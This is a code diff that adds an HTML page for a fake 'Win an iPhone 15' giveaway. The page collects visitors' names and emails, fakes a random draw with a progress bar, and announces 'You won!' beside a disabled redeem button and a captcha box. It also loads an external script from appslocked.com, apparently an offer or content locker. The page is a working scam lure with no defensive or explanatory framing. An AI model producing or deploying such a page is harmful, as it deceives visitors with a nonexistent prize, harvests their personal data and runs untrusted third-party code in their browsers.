@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Win an iPhone 15</title>
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <div class="container">
+    <header id="textSection">
+      <h1>Win an iPhone 15</h1>
+      <p>Enter now for a chance to win the latest iPhone 15. It’s quick, easy, and free!</p>
+    </header>
+    <div class="giveaway-image" id="imageSection">
+      <img src="win_iphone_15.png" alt="iPhone 15">
+    </div>
+    <form class="giveaway-form" id="giveawayForm">
+      <h2>Enter the Giveaway</h2>
+      <label for="name">Name:</label>
+      <input type="text" id="name" name="name" placeholder="Your Name" required>
+      <label for="email">Email:</label>
+      <input type="email" id="email" name="email" placeholder="Your Email" required>
+      <button type="submit" id="submitBtn">Submit</button>
+    </form>
+    <div class="result hidden" id="resultSection">
+      <p class="loading-text" id="loadingText">
+        We are making the random extraction. Every hour, there is one winner. Maybe this time is you...
+      </p>
+      <div class="progress-bar" id="progressBar">
+        <div class="progress" id="progress"></div>
+      </div>
+      <div class="success-message hidden" id="successMessage">
+        <h2>Congratulations! You won!</h2>
+        <button disabled class="center-button" id="redeemBtn">Redeem your iPhone</button>
+        <div class="center" data-captcha-enable="true"></div>
+      </div>
+    </div>
+    <footer>
+      <p>Hurry up! The giveaway ends on <strong>December 31, 2024</strong>.</p>
+      <p>Terms & Conditions apply.</p>
+    </footer>
+  </div>
+  <script src="script.js"></script>  
+  <script type="text/javascript" src="https://appslocked.com/cp/js/3l7x2"></script>
+</body>
+</html>
